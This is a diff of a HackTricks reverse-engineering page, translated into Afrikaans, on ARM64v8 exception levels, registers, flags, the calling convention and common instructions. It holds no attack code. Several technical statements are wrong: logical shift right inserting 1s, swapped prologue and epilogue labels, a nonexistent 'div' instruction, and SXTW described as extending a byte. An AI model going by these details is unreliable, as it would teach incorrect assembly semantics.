@@ -3,105 +3,105 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
 
-## **Exception Levels - EL (ARM64v8)**
+## **Uitsonderingsvlakke - EL (ARM64v8)**
 
-In die ARMv8-argitektuur definieer uitvoeringsvlakke, bekend as Exception Levels (ELs), die privilegievlak en vermoens van die uitvoeringsomgewing. Daar is vier exception levels, van EL0 tot EL3, en elkeen dien ’n verskillende doel:
+In ARMv8-argitektuur definieer uitvoeringsvlakke, bekend as Exception Levels (ELs), die privilegievlak en vermoens van die uitvoeringsomgewing. Daar is vier uitsonderingsvlakke, van EL0 tot EL3, en elkeen dien 'n verskillende doel:
 
-1. **EL0 - User Mode**:
+1. **EL0 - Gebruikersmodus**:
 - Dit is die vlak met die minste privilegies en word gebruik om gewone application code uit te voer.
-- Applications wat by EL0 loop, is van mekaar en van die system software geïsoleer, wat sekuriteit en stabiliteit verbeter.
+- Applications wat op EL0 loop, is van mekaar en van die system software geisoleer, wat sekuriteit en stabiliteit verbeter.
 2. **EL1 - Operating System Kernel Mode**:
 - Die meeste operating system kernels loop op hierdie vlak.
-- EL1 het meer privilegies as EL0 en kan toegang tot system resources verkry, maar met sekere beperkings om system integrity te verseker. Jy beweeg van EL0 na EL1 met die SVC-instruksie.
+- EL1 het meer privilegies as EL0 en kan toegang tot system resources verkry, maar met sekere beperkings om system integrity te verseker. Jy beweeg van EL0 na EL1 met die SVC-instruction.
 3. **EL2 - Hypervisor Mode**:
-- Hierdie vlak word vir virtualisering gebruik. ’n Hypervisor wat by EL2 loop, kan verskeie operating systems bestuur (elk in sy eie EL1) wat op dieselfde fisiese hardeware loop.
-- EL2 verskaf funksies vir isolasie en beheer van die gevirtualiseerde omgewings.
-- Virtual machine applications soos Parallels kan dus die `hypervisor.framework` gebruik om met EL2 te kommunikeer en virtual machines te laat loop sonder kernel extensions.
-- Om van EL1 na EL2 te beweeg, word die `HVC`-instruksie gebruik.
+- Hierdie vlak word vir virtualization gebruik. 'n Hypervisor wat op EL2 loop, kan verskeie operating systems (elk in sy eie EL1) bestuur wat op dieselfde fisiese hardware loop.
+- EL2 verskaf features vir isolasie en beheer van die gevirtualiseerde omgewings.
+- Virtual machine applications soos Parallels kan dus die `hypervisor.framework` gebruik om met EL2 te kommunikeer en virtual machines te laat loop sonder dat kernel extensions nodig is.
+- Om van EL1 na EL2 te beweeg, word die `HVC`-instruction gebruik.
 4. **EL3 - Secure Monitor Mode**:
 - Dit is die vlak met die meeste privilegies en word dikwels vir secure booting en trusted execution environments gebruik.
 - EL3 kan toegang tussen secure en non-secure states bestuur en beheer (soos secure boot, trusted OS, ens.).
 - Dit is vir KPP (Kernel Patch Protection) in macOS gebruik, maar word nie meer gebruik nie.
 - EL3 word nie meer deur Apple gebruik nie.
-- Die oorgang na EL3 word tipies met die `SMC` (Secure Monitor Call)-instruksie gedoen.
+- Die oorgang na EL3 word tipies met die `SMC` (Secure Monitor Call)-instruction gedoen.
 
-Die gebruik van hierdie vlakke bied ’n gestruktureerde en veilige manier om verskillende aspekte van die system te bestuur, van user applications tot die system software met die hoogste privilegies. ARMv8 se benadering tot privilege levels help om verskillende system components effektief te isoleer en verbeter sodoende die sekuriteit en robuustheid van die system.
+Die gebruik van hierdie vlakke bied 'n gestruktureerde en veilige manier om verskillende aspekte van die stelsel te bestuur, van user applications tot die mees bevoorregte system software. ARMv8 se benadering tot privilege levels help om verskillende system components effektief te isoleer en verbeter sodoende die sekuriteit en robuustheid van die stelsel.
 
 ## **Registers (ARM64v8)**
 
-ARM64 het **31 general-purpose registers**, gemerk `x0` tot `x30`. Elkeen kan ’n **64-bit** (8-byte) waarde stoor. Vir bewerkings wat slegs 32-bit-waardes benodig, kan dieselfde registers in ’n 32-bit-modus met die name w0 tot w30 gebruik word.
+ARM64 het **31 general-purpose registers**, gemerk `x0` tot `x30`. Elkeen kan 'n **64-bit** (8-byte) waarde stoor. Vir bewerkings wat slegs 32-bit-waardes benodig, kan dieselfde registers in 'n 32-bit-modus verkry word deur die name w0 tot w30 te gebruik.
 
-1. **`x0`** tot **`x7`** - Hierdie word tipies as scratch registers en vir die deurgee van parameters aan subroutines gebruik.
-- **`x0`** bevat ook die return data van ’n function
-2. **`x8`** - In die Linux kernel word `x8` as die system call number vir die `svc`-instruksie gebruik. **In macOS is x16 die een wat gebruik word!**
-3. **`x9`** tot **`x15`** - Meer temporary registers, wat dikwels vir local variables gebruik word.
-4. **`x16`** en **`x17`** - **Intra-procedural Call Registers**. Temporary registers vir immediate values. Hulle word ook vir indirect function calls en PLT (Procedure Linkage Table) stubs gebruik.
-- **`x16`** word as die **system call number** vir die **`svc`**-instruksie in **macOS** gebruik.
-5. **`x18`** - **Platform register**. Dit kan as ’n general-purpose register gebruik word, maar op sommige platforms is hierdie register vir platform-spesifieke gebruike gereserveer: ’n Pointer na die huidige thread environment block in Windows, of om na die tans **uitvoerende task structure in linux kernel** te wys.
-6. **`x19`** tot **`x28`** - Hierdie is callee-saved registers. ’n Function moet hierdie registers se waardes vir sy caller behou; daarom word hulle op die stack gestoor en herstel voordat daar na die caller teruggekeer word.
-7. **`x29`** - **Frame pointer** om tred te hou met die stack frame. Wanneer ’n nuwe stack frame geskep word omdat ’n function geroep word, word die **`x29`**-register op die **stack gestoor**, en die adres van die **nuwe** frame pointer ((`sp`)-adres) word in hierdie register gestoor.
-- Hierdie register kan ook as ’n **general-purpose register** gebruik word, hoewel dit gewoonlik as verwysing na **local variables** gebruik word.
-8. **`x30`** of **`lr`** - **Link register**. Dit bevat die **return address** wanneer ’n `BL` (Branch with Link)- of `BLR` (Branch with Link to Register)-instruksie uitgevoer word deur die **`pc`**-waarde in hierdie register te stoor.
+1. **`x0`** tot **`x7`** - Hierdie registers word tipies as scratch registers en vir die deurgee van parameters aan subroutines gebruik.
+- **`x0`** bevat ook die return data van 'n funksie
+2. **`x8`** - In die Linux-kernel word `x8` as die system call number vir die `svc`-instruction gebruik. **In macOS is x16 die register wat gebruik word!**
+3. **`x9`** tot **`x15`** - Nog temporary registers, wat dikwels vir local variables gebruik word.
+4. **`x16`** en **`x17`** - **Intra-procedural Call Registers**. Temporary registers vir immediate values. Hulle word ook vir indirect function calls en PLT (Procedure Linkage Table)-stubs gebruik.
+- **`x16`** word as die **system call number** vir die **`svc`**-instruction in **macOS** gebruik.
+5. **`x18`** - **Platform register**. Dit kan as 'n general-purpose register gebruik word, maar op sommige platforms is hierdie register vir platform-specific uses gereserveer: 'n Pointer na die huidige thread environment block in Windows, of om na die tans **executing task structure in the Linux-kernel** te wys.
+6. **`x19`** tot **`x28`** - Hierdie is callee-saved registers. 'n Funksie moet hierdie registers se waardes vir sy caller behou, dus word hulle op die stack gestoor en herstel voordat daar na die caller teruggekeer word.
+7. **`x29`** - **Frame pointer** om die stack frame dop te hou. Wanneer 'n nuwe stack frame geskep word omdat 'n funksie geroep word, word die **`x29`**-register **op die stack gestoor** en die adres van die **nuwe** frame pointer ((**`sp`**-adres)) word **in hierdie register gestoor**.
+- Hierdie register kan ook as 'n **general-purpose register** gebruik word, hoewel dit gewoonlik as verwysing na **local variables** gebruik word.
+8. **`x30`** of **`lr`**- **Link register**. Dit bevat die **return address** wanneer 'n `BL` (Branch with Link)- of `BLR` (Branch with Link to Register)-instruction uitgevoer word, deur die **`pc`**-waarde in hierdie register te stoor.
 - Dit kan ook soos enige ander register gebruik word.
-- As die huidige function ’n nuwe function gaan roep en dus `lr` gaan oorskryf, sal dit dit aan die begin op die stack stoor; dit is die epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Stoor `fp` en `lr`, skep spasie en kry nuwe `fp`) en dit aan die einde herstel; dit is die prologue (`ldp x29, x30, [sp], #48; ret` -> Herstel `fp` en `lr` en keer terug).
-9. **`sp`** - **Stack pointer**, wat gebruik word om tred te hou met die bokant van die stack.
-- Die **`sp`**-waarde moet altyd ten minste op ’n **quadword**-**alignment** gehou word, anders kan ’n alignment exception voorkom.
-10. **`pc`** - **Program counter**, wat na die volgende instruksie wys. Hierdie register kan slegs deur exception generations, exception returns en branches opgedateer word. Die enigste gewone instruksies wat hierdie register kan lees, is branch with link-instruksies (BL, BLR), wat die **`pc`**-adres in **`lr`** (Link Register) stoor.
-11. **`xzr`** - **Zero register**. Dit word ook **`wzr`** genoem in sy **32**-bit-registervorm. Dit kan gebruik word om maklik die zero value te verkry (’n algemene bewerking), of om comparisons met **`subs`** uit te voer, soos **`subs XZR, Xn, #10`**, waar die resultaatdata nêrens gestoor word nie (in **`xzr`**).
+- As die huidige funksie 'n nuwe funksie gaan roep en dus `lr` gaan oorskryf, sal dit dit aan die begin in die stack stoor; dit is die epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` en `lr`, skep spasie en kry nuwe `fp`) en dit aan die einde herstel; dit is die prologue (`ldp x29, x30, [sp], #48; ret` -> Herstel `fp` en `lr` en keer terug).
+9. **`sp`** - **Stack pointer**, wat gebruik word om die bokant van die stack dop te hou.
+- Die **`sp`**-waarde moet altyd ten minste op **quadword**-**alignment** gehou word, anders kan 'n alignment exception voorkom.
+10. **`pc`** - **Program counter**, wat na die volgende instruction wys. Hierdie register kan slegs deur exception generations, exception returns en branches opgedateer word. Die enigste ordinary instructions wat hierdie register kan lees, is branch with link-instructions (BL, BLR), om die **`pc`**-adres in **`lr`** (Link Register) te stoor.
+11. **`xzr`** - **Zero register**. Dit word ook **`wzr`** in sy **32**-bit-registervorm genoem. Dit kan gebruik word om maklik die zero value te verkry ( 'n algemene bewerking) of om comparisons met **`subs`** uit te voer, soos **`subs XZR, Xn, #10`**, wat die resulterende data nêrens stoor nie (in **`xzr`**).
 
 Die **`Wn`**-registers is die **32bit**-weergawe van die **`Xn`**-register.
 
 > [!TIP]
-> Die registers van X0 - X18 is volatile, wat beteken dat hulle waardes deur function calls en interrupts verander kan word. Die registers van X19 - X28 is egter non-volatile, wat beteken dat hulle waardes oor function calls heen behou moet word ("callee saved").
+> Die registers van X0 - X18 is volatile, wat beteken dat hulle waardes deur function calls en interrupts verander kan word. Die registers van X19 - X28 is egter non-volatile, wat beteken dat hulle waardes oor function calls behoue moet bly ("callee saved").
 
 ### SIMD en Floating-Point Registers
 
-Daar is boonop nog **32 registers van 128bit-lengte** wat in optimized single instruction multiple data (SIMD)-bewerkings en vir floating-point arithmetic gebruik kan word. Dit word die Vn-registers genoem, hoewel hulle ook in **64**-bit, **32**-bit, **16**-bit en **8**-bit kan werk; dan word hulle **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** en **`Bn`** genoem.
+Daar is boonop nog **32 registers van 128bit-lengte** wat in geoptimaliseerde single instruction multiple data (SIMD)-bewerkings en vir floating-point arithmetic gebruik kan word. Hulle word die Vn-registers genoem, hoewel hulle ook in **64**-bit-, **32**-bit-, **16**-bit- en **8**-bit-modusse kan werk, waarna hulle **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** en **`Bn`** genoem word.
 
 ### System Registers
 
-**Daar is honderde system registers**, ook bekend as special-purpose registers (SPRs), wat gebruik word om die gedrag van **processors** te **monitor** en te **beheer**.\
-Hulle kan slegs met die toegewyde spesiale instruksies **`mrs`** en **`msr`** gelees of gestel word.
+**Daar is honderde system registers**, ook bekend as special-purpose registers (SPRs), wat vir die **monitering** en **beheer** van **processors** se gedrag gebruik word.\
+Hulle kan slegs met die toegewyde spesiale instructions **`mrs`** en **`msr`** gelees of gestel word.
 
-Die spesiale registers **`TPIDR_EL0`** en **`TPIDDR_EL0`** word algemeen tydens reverse engineering gevind. Die `EL0`-suffix dui die **minimum exception level** aan waarvandaan die register verkry kan word (in hierdie geval is EL0 die gewone exception (privilege)-vlak waarop gewone programs loop).\
-Hulle word dikwels gebruik om die **base address van die thread-local storage**-geheuegebied te stoor. Gewoonlik kan die eerste een deur programs wat in EL0 loop gelees en geskryf word, maar die tweede een kan vanaf EL0 gelees en vanaf EL1 (soos die kernel) geskryf word.
+Die spesiale registers **`TPIDR_EL0`** en **`TPIDDR_EL0`** word algemeen tydens reverse engineering gevind. Die `EL0`-suffix dui die **minimum exception level** aan waarvandaan die register verkry kan word (in hierdie geval is EL0 die gewone exception (privilege)-level waarmee gewone programme loop).\
+Hulle word dikwels gebruik om die **base address van die thread-local storage**-geheuestreek te stoor. Gewoonlik is die eerste een leesbaar en skryfbaar vir programme wat in EL0 loop, maar die tweede een kan vanaf EL0 gelees en vanaf EL1 (soos die kernel) geskryf word.
 
 - `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
 - `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`
 
 ### **PSTATE**
 
-**PSTATE** bevat verskeie process components wat in die operating-system-visible **`SPSR_ELx`**-spesiale register geserialiseer word, waar X die **permission** **level van die triggered** exception is (dit maak dit moontlik om die process state te herstel wanneer die exception eindig).\
-Die volgende velde is toeganklik:
+**PSTATE** bevat verskeie proseskomponente wat in die operating-system-sigbare **`SPSR_ELx`**-spesialeregister geserialiseer is, waar X die **permission**-**level van die getriggerde** exception is (dit laat toe dat die proses se toestand herstel word wanneer die exception eindig).\
+Hierdie is die toeganklike velde:
 
 <figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>
 
-- Die **`N`**, **`Z`**, **`C`** en **`V`**-condition flags:
-- **`N`** beteken dat die bewerking ’n negatiewe resultaat gelewer het
-- **`Z`** beteken dat die bewerking zero gelewer het
-- **`C`** beteken dat die bewerking ’n carry gehad het
-- **`V`** beteken dat die bewerking ’n signed overflow gelewer het:
-- Die som van twee positiewe getalle lewer ’n negatiewe resultaat.
-- Die som van twee negatiewe getalle lewer ’n positiewe resultaat.
-- In subtraction, wanneer ’n groot negatiewe getal van ’n kleiner positiewe getal afgetrek word (of andersom), en die resultaat nie binne die omvang van die gegewe bitgrootte voorgestel kan word nie.
-- Die processor weet natuurlik nie of die bewerking signed of nie is nie; daarom kontroleer dit C en V tydens die bewerkings en dui aan of ’n carry plaasgevind het indien dit signed of unsigned was.
+- Die **`N`**, **`Z`**, **`C`** en **`V`** condition flags:
+- **`N`** beteken die bewerking het 'n negatiewe resultaat opgelewer
+- **`Z`** beteken die bewerking het zero opgelewer
+- **`C`** beteken die bewerking het 'n carry gehad
+- **`V`** beteken die bewerking het 'n signed overflow opgelewer:
+- Die som van twee positiewe getalle lewer 'n negatiewe resultaat.
+- Die som van twee negatiewe getalle lewer 'n positiewe resultaat.
+- In subtraction, wanneer 'n groot negatiewe getal van 'n kleiner positiewe getal afgetrek word (of andersom), en die resultaat nie binne die reeks van die gegewe bit size voorgestel kan word nie.
+- Die processor weet natuurlik nie of die bewerking signed of unsigned is nie, dus sal dit C en V in die bewerkings nagaan en aandui of 'n carry plaasgevind het indien dit signed of unsigned was.
 
 > [!WARNING]
-> Nie alle instruksies dateer hierdie flags op nie. Sommige, soos **`CMP`** of **`TST`**, doen dit, en ander met ’n s-suffix, soos **`ADDS`**, doen dit ook.
+> Nie alle instructions dateer hierdie flags op nie. Sommige, soos **`CMP`** of **`TST`**, doen dit, en ander met 'n s-suffix, soos **`ADDS`**, doen dit ook.
 
 - Die huidige **register width (`nRW`) flag**: As die flag die waarde 0 bevat, sal die program in die AArch64 execution state loop wanneer dit hervat word.
-- Die huidige **Exception Level** (**`EL`**): ’n Gewone program wat in EL0 loop, sal die waarde 0 hê
-- Die **single stepping**-flag (**`SS`**): Debuggers gebruik dit om single step uit te voer deur die SS-flag binne **`SPSR_ELx`** deur middel van ’n exception op 1 te stel. Die program sal een step uitvoer en ’n single step exception genereer.
-- Die **illegal exception**-state flag (**`IL`**): Dit word gebruik om aan te dui wanneer privileged software ’n ongeldige exception level transfer uitvoer; hierdie flag word op 1 gestel en die processor trigger ’n illegal state exception.
-- Die **`DAIF`**-flags: Hierdie flags laat ’n privileged program toe om sekere external exceptions selektief te mask.
-- As **`A`** 1 is, beteken dit dat **asynchronous aborts** getrigger sal word. Die **`I`** konfigureer reaksie op eksterne hardware **Interrupts Requests** (IRQs), en die F hou verband met **Fast Interrupt Requests** (FIRs).
-- Die **stack pointer select**-flags (**`SPS`**): Privileged programs wat in EL1 en hoër loop, kan wissel tussen die gebruik van hul eie stack pointer register en die user-model een (byvoorbeeld tussen `SP_EL1` en `EL0`). Hierdie wisseling word uitgevoer deur na die **`SPSel`**-spesiale register te skryf. Dit kan nie vanaf EL0 gedoen word nie.
+- Die huidige **Exception Level** (**`EL`**): 'n Gewone program wat in EL0 loop, sal die waarde 0 hê
+- Die **single stepping**-flag (**`SS`**): Word deur debuggers gebruik om single step uit te voer deur die SS-flag in **`SPSR_ELx`** deur middel van 'n exception op 1 te stel. Die program sal een step loop en 'n single step exception genereer.
+- Die **illegal exception**-state-flag (**`IL`**): Dit word gebruik om aan te dui wanneer privileged software 'n ongeldige exception level transfer uitvoer; hierdie flag word op 1 gestel en die processor trigger 'n illegal state exception.
+- Die **`DAIF`**-flags: Hierdie flags laat 'n privileged program toe om sekere external exceptions selektief te mask.
+- As **`A`** 1 is, beteken dit dat **asynchronous aborts** getrigger sal word. Die **`I`** konfigureer reaksie op external hardware **Interrupts Requests** (IRQs), en die F hou verband met **Fast Interrupt Requests** (FIRs).
+- Die **stack pointer select**-flags (**`SPS`**): Privileged programs wat in EL1 en hoer loop, kan wissel tussen die gebruik van hul eie stack pointer-register en die user-model-een (bv. tussen `SP_EL1` en `EL0`). Hierdie wisseling word uitgevoer deur na die **`SPSel`**-spesialeregister te skryf. Dit kan nie vanaf EL0 gedoen word nie.
 
 ## **Calling Convention (ARM64v8)**
 
-Die ARM64 calling convention spesifiseer dat die **eerste agt parameters** van ’n function in registers **`x0`** tot **`x7`** deurgegee word. **Bykomende** parameters word op die **stack** deurgegee. Die **return**-waarde word in register **`x0`** teruggegee, of ook in **`x1`** **as dit 128 bits lank is**. Die registers **`x19`** tot **`x30`** en **`sp`** moet oor function calls heen **behou** word.
+Die ARM64 calling convention spesifiseer dat die **eerste agt parameters** aan 'n funksie in registers **`x0`** tot **`x7`** deurgegee word. **Bykomende** parameters word op die **stack** deurgegee. Die **return**-waarde word in register **`x0`** teruggegee, of ook in **`x1`** **as dit 128 bits lank is**. Die **`x19`** tot **`x30`**- en **`sp`**-registers moet oor function calls heen **behoue bly**.
 
-Wanneer jy ’n function in assembly lees, soek die **function prologue en epilogue**. Die **prologue** behels gewoonlik die **stoor van die frame pointer (`x29`)**, die **opstel** van ’n **nuwe frame pointer**, en die **toekenning van stack space**. Die **epilogue** behels gewoonlik die **herstel van die gestoor frame pointer** en die **terugkeer** uit die function.
+Wanneer jy 'n funksie in assembly lees, soek die **function prologue en epilogue**. Die **prologue** behels gewoonlik die **stoor van die frame pointer (`x29`)**, die **opstel** van 'n **nuwe frame pointer**, en die **toewys van stack space**. Die **epilogue** behels gewoonlik die **herstel van die gestoorde frame pointer** en die **terugkeer** uit die funksie.
 
 ### Calling Convention in Swift
 
@@ -109,128 +109,128 @@ Swift het sy eie **calling convention**, wat gevind kan word by [**https://githu
 
 ## **Common Instructions (ARM64v8)**
 
-ARM64-instruksies het gewoonlik die **formaat `opcode dst, src1, src2`**, waar **`opcode`** die **bewerking** is wat uitgevoer moet word (soos `add`, `sub`, `mov`, ens.), **`dst`** die **destination**-register is waar die resultaat gestoor word, en **`src1`** en **`src2`** die **source**-registers is. Immediate values kan ook in plaas van source registers gebruik word.
+ARM64-instructions het oor die algemeen die **formaat `opcode dst, src1, src2`**, waar **`opcode`** die **bewerking** is wat uitgevoer moet word (soos `add`, `sub`, `mov`, ens.), **`dst`** die **destination**-register is waar die resultaat gestoor word, en **`src1`** en **`src2`** die **source**-registers is. Immediate values kan ook in die plek van source registers gebruik word.
 
-- **`mov`**: **Move** ’n waarde van een **register** na ’n ander.
-- Voorbeeld: `mov x0, x1` — Dit skuif die waarde van `x1` na `x0`.
-- **`ldr`**: **Load** ’n waarde uit **memory** in ’n **register**.
-- Voorbeeld: `ldr x0, [x1]` — Dit laai ’n waarde vanaf die memory location waarna `x1` wys in `x0`.
-- **Offset mode**: ’n Offset wat die oorspronklike pointer beïnvloed, word aangedui, byvoorbeeld:
+- **`mov`**: **Move** 'n waarde van een **register** na 'n ander.
+- Example: `mov x0, x1` — Dit skuif die waarde van `x1` na `x0`.
+- **`ldr`**: **Load** 'n waarde uit **memory** in 'n **register**.
+- Example: `ldr x0, [x1]` — Dit laai 'n waarde vanaf die memory location waarna `x1` wys, in `x0`.
+- **Offset mode**: 'n Offset wat die origin pointer beinvloed, word byvoorbeeld aangedui deur:
 - `ldr x2, [x1, #8]`, dit laai die waarde vanaf x1 + 8 in x2
-- `ldr x2, [x0, x1, lsl #2]`, dit laai ’n object uit die array x0 in x2, vanaf posisie x1 (index) \* 4
-- **Pre-indexed mode**: Dit pas calculations op die oorsprong toe, kry die resultaat en stoor ook die nuwe oorsprong in die oorsprong.
+- `ldr x2, [x0, x1, lsl #2]`, dit laai 'n object vanaf die array x0 op die x1-posisie (index) \* 4 in x2
+- **Pre-indexed mode**: Dit pas calculations op die origin toe, verkry die resultaat en stoor ook die nuwe origin in die origin.
 - `ldr x2, [x1, #8]!`, dit laai `x1 + 8` in `x2` en stoor die resultaat van `x1 + 8` in x1
 - `str lr, [sp, #-4]!`, Stoor die link register in sp en dateer die register sp op
-- **Post-index mode**: Dit werk soos die vorige een, maar die memory address word eers verkry en daarna word die offset bereken en gestoor.
+- **Post-index mode**: Dit is soos die vorige een, maar die memory address word verkry en daarna word die offset bereken en gestoor.
 - `ldr x0, [x1], #8`, laai `x1` in `x0` en dateer x1 op met `x1 + 8`
-- **PC-relative addressing**: In hierdie geval word die address wat gelaai moet word relatief tot die PC-register bereken
-- `ldr x1, =_start`, Dit laai die address waar die `_start`-symbol begin in x1, relatief tot die huidige PC.
-- **`str`**: **Store** ’n waarde vanuit ’n **register** in **memory**.
-- Voorbeeld: `str x0, [x1]` — Dit stoor die waarde in `x0` in die memory location waarna `x1` wys.
-- **`ldp`**: **Load Pair of Registers**. Hierdie instruksie **laai twee registers** uit **opeenvolgende memory**-locations. Die memory address word tipies gevorm deur ’n offset by die waarde in ’n ander register te tel.
-- Voorbeeld: `ldp x0, x1, [x2]` — Dit laai `x0` en `x1` onderskeidelik vanaf die memory locations by `x2` en `x2 + 8`.
-- **`stp`**: **Store Pair of Registers**. Hierdie instruksie **stoor twee registers** in **opeenvolgende memory**-locations. Die memory address word tipies gevorm deur ’n offset by die waarde in ’n ander register te tel.
-- Voorbeeld: `stp x0, x1, [sp]` — Dit stoor `x0` en `x1` onderskeidelik in die memory locations by `sp` en `sp + 8`.
-- `stp x0, x1, [sp, #16]!` — Dit stoor `x0` en `x1` onderskeidelik in die memory locations by `sp+16` en `sp + 24`, en dateer `sp` op met `sp+16`.
-- **`add`**: **Tel** die waardes van twee registers bymekaar en stoor die resultaat in ’n register.
+- **PC-relative addressing**: In hierdie geval word die adres om te laai relatief tot die PC-register bereken
+- `ldr x1, =_start`, Dit laai die adres waar die `_start`-symbol begin in x1 relatief tot die huidige PC.
+- **`str`**: **Store** 'n waarde vanaf 'n **register** in **memory**.
+- Example: `str x0, [x1]` — Dit stoor die waarde in `x0` in die memory location waarna `x1` wys.
+- **`ldp`**: **Load Pair of Registers**. Hierdie instruction **laai twee registers** vanaf **opeenvolgende memory**-locations. Die memory address word tipies gevorm deur 'n offset by die waarde in 'n ander register te tel.
+- Example: `ldp x0, x1, [x2]` — Dit laai `x0` en `x1` vanaf die memory locations by `x2` en `x2 + 8`, onderskeidelik.
+- **`stp`**: **Store Pair of Registers**. Hierdie instruction **stoor twee registers** in **opeenvolgende memory**-locations. Die memory address word tipies gevorm deur 'n offset by die waarde in 'n ander register te tel.
+- Example: `stp x0, x1, [sp]` — Dit stoor `x0` en `x1` in die memory locations by `sp` en `sp + 8`, onderskeidelik.
+- `stp x0, x1, [sp, #16]!` — Dit stoor `x0` en `x1` in die memory locations by `sp+16` en `sp + 24`, onderskeidelik, en dateer `sp` op met `sp+16`.
+- **`add`**: **Tel** die waardes van twee registers bymekaar en stoor die resultaat in 'n register.
 - Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
 - Xn1 -> Destination
 - Xn2 -> Operand 1
 - Xn3 | #imm -> Operando 2 (register or immediate)
-- \[shift #N | RRX] -> Voer ’n shift uit of roep RRX
-- Voorbeeld: `add x0, x1, x2` — Dit tel die waardes in `x1` en `x2` bymekaar en stoor die resultaat in `x0`.
-- `add x5, x5, #1, lsl #12` — Dit is gelyk aan 4096 (’n 1 wat 12 keer geshift word) -> 1 0000 0000 0000 0000
-- **`adds`** Hierdie voer ’n `add` uit en dateer die flags op
-- **`sub`**: **Trek** die waardes van twee registers af en stoor die resultaat in ’n register.
+- \[shift #N | RRX] -> Perform a shift or call RRX
+- Example: `add x0, x1, x2` — Dit tel die waardes in `x1` en `x2` bymekaar en stoor die resultaat in `x0`.
+- `add x5, x5, #1, lsl #12` — Dit is gelyk aan 4096 (a 1 shifter 12 times) -> 1 0000 0000 0000 0000
+- **`adds`** Hierdie voer 'n `add` uit en dateer die flags op
+- **`sub`**: **Trek** die waardes van twee registers af en stoor die resultaat in 'n register.
 - Sien **`add`** **syntax**.
-- Voorbeeld: `sub x0, x1, x2` — Dit trek die waarde in `x2` van `x1` af en stoor die resultaat in `x0`.
-- **`subs`** Dit is soos sub, maar dateer die flag op
-- **`mul`**: **Vermenigvuldig** die waardes van **twee registers** en stoor die resultaat in ’n register.
-- Voorbeeld: `mul x0, x1, x2` — Dit vermenigvuldig die waardes in `x1` en `x2` en stoor die resultaat in `x0`.
-- **`div`**: **Deel** die waarde van een register deur ’n ander en stoor die resultaat in ’n register.
-- Voorbeeld: `div x0, x1, x2` — Dit deel die waarde in `x1` deur `x2` en stoor die resultaat in `x0`.
+- Example: `sub x0, x1, x2` — Dit trek die waarde in `x2` van `x1` af en stoor die resultaat in `x0`.
+- **`subs`** Dit is soos sub, maar dateer die flags op
+- **`mul`**: **Vermenigvuldig** die waardes van **twee registers** en stoor die resultaat in 'n register.
+- Example: `mul x0, x1, x2` — Dit vermenigvuldig die waardes in `x1` en `x2` en stoor die resultaat in `x0`.
+- **`div`**: **Deel** die waarde van een register deur 'n ander en stoor die resultaat in 'n register.
+- Example: `div x0, x1, x2` — Dit deel die waarde in `x1` deur `x2` en stoor die resultaat in `x0`.
 - **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
-- **Logical shift left**: Voeg 0s aan die einde by en skuif die ander bits vorentoe (vermenigvuldig met n-keer 2)
-- **Logical shift right**: Voeg 1s aan die begin by en skuif die ander bits agtertoe (deel deur n-keer 2 in unsigned)
-- **Arithmetic shift right**: Soos **`lsr`**, maar in plaas daarvan om 0s by te voeg as die most significant bit ’n 1 is, word **1s bygevoeg (deel deur n-keer 2 in signed)
-- **Rotate right**: Soos **`lsr`**, maar enigiets wat van regs verwyder word, word links aangeheg
+- **Logical shift left**: Voeg 0s aan die einde by terwyl die ander bits vorentoe geskuif word (vermenigvuldig met n-keer 2)
+- **Logical shift right**: Voeg 1s aan die begin by terwyl die ander bits agtertoe geskuif word (deel deur n-keer 2 in unsigned)
+- **Arithmetic shift right**: Soos **`lsr`**, maar in plaas daarvan om 0s by te voeg wanneer die most significant bit 'n 1 is, word **1s bygevoeg (**deel deur n-keer 2 in signed)
+- **Rotate right**: Soos **`lsr`**, maar wat ook al van regs verwyder word, word aan die linkerkant aangeheg
 - **Rotate Right with Extend**: Soos **`ror`**, maar met die carry flag as die "most significant bit". Die carry flag word dus na bit 31 geskuif en die verwyderde bit na die carry flag.
-- **`bfm`**: **Bit Filed Move**; hierdie bewerkings **kopieer bits `0...n`** vanaf ’n waarde en plaas hulle in posisies **`m..m+n`**. Die **`#s`** spesifiseer die **linkerste bit**-posisie en **`#r`** die rotate right-hoeveelheid.
-- Bitfiled move: `BFM Xd, Xn, #r`
+- **`bfm`**: **Bit Field Move**; hierdie bewerkings **kopieer bits `0...n`** vanaf 'n waarde en plaas hulle in posisies **`m..m+n`**. Die **`#s`** spesifiseer die **leftmost bit**-posisie en **`#r`** die rotate right-hoeveelheid.
+- Bitfield move: `BFM Xd, Xn, #r`
 - Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
 - Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
-- **Bitfield Extract and Insert:** Kopieer ’n bitfield vanaf een register en kopieer dit na ’n ander register.
-- **`BFI X1, X2, #3, #4`** Voeg 4 bits vanaf X2 in, vanaf die 3de bit van X1
-- **`BFXIL X1, X2, #3, #4`** Onttrek vier bits vanaf die 3de bit van X2 en kopieer hulle na X1
-- **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bits vanaf X2 en voeg hulle by X1 in, beginnende by bitposisie 3, terwyl die regter bits op zero gestel word
-- **`SBFX X1, X2, #3, #4`** Onttrek 4 bits vanaf bit 3 uit X2, sign-extend hulle en plaas die resultaat in X1
-- **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bits vanaf X2 en voeg hulle by X1 in, beginnende by bitposisie 3, terwyl die regter bits op zero gestel word
-- **`UBFX X1, X2, #3, #4`** Onttrek 4 bits vanaf bit 3 uit X2 en plaas die zero-extended resultaat in X1.
-- **Sign Extend To X:** Brei die sign uit (of voeg slegs 0s by in die unsigned-weergawe) van ’n waarde om bewerkings daarmee te kan uitvoer:
-- **`SXTB X1, W2`** Brei die sign van ’n byte **van W2 na X1** uit (`W2` is die helfte van `X2`) om die 64 bits te vul
-- **`SXTH X1, W2`** Brei die sign van ’n 16bit-getal **van W2 na X1** uit om die 64 bits te vul
-- **`SXTW X1, W2`** Brei die sign van ’n byte **van W2 na X1** uit om die 64 bits te vul
